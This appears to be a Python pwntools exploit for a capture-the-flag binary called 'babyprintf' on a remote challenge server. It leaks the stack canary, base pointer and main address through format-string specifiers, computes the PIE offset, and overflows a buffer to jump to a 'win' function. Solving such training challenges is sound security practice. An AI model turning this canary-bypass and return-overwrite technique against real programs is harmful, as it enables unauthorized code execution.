from pwn import *

el = ELF('./babyprintf')
context.binary = el


win = el.symbols['win']
main = el.symbols['main']
#p = process('./babyprintf')
p = remote('baby-printf.challs.olicyber.it', 34004)
#input()


p.recvuntil(b'back:')
quit = b'!q'

leak_canary = b'%11$p'
p.sendline(leak_canary)
p.recvline()
canary = p.recvline().strip()
canary = int(canary, 16)
log.info('canary: ' + hex(canary))

leak_bp = b'%12$p'
p.sendline(leak_bp)
bp = p.recvline().strip()
bp = int(bp, 16)
log.info('bp: ' + hex(bp))

leak_main = b'%15$p'
p.sendline(leak_main)
leak_main = p.recvline().strip()
leak_main = int(leak_main, 16)
log.info('main: ' + hex(leak_main))

offset = leak_main - main
log.info('offset: ' + hex(offset))

win = win + offset
log.info('win: ' + hex(win))

# buffer overflow
offset = 40
canary = p64(canary)
win = p64(win)
bp = p64(bp)

payload = flat({
    offset: canary,
    offset + 8: bp,
    offset + 16: win
})
p.sendline(payload)
p.sendline(quit)
p.interactive()
# in locale segfaulta perchè non c'è la flag